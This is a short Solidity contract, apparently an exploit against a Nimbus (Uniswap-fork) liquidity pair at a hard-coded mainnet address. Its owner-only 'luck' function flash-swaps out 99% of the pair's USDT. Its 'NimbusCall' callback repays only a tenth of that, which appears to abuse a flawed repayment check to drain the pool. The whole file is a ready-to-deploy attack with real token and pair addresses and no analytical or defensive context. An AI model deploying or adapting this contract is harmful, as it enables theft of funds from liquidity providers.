pragma solidity ^0.8.0;
import "./interface/Uniswap/IUniswapV2Pair.sol";
import "./interface/Uniswap/IUniswapV2Factory.sol";
import "./interface/Uniswap/IUniswapV2Router.sol";

interface IERC20 {
    function transfer(address, uint) external;

    function balanceOf(address) external returns(uint);
}
contract Luck {
    address private owner;
    address private pair = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;
    address private usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    constructor() {
        owner = msg.sender;    
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function luck() external onlyOwner {
        uint amount = IERC20(usdt).balanceOf(pair) * 99 / 100;
        IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));
    }
    function NimbusCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        IERC20(usdt).transfer(pair, amount / 10 );
    }
}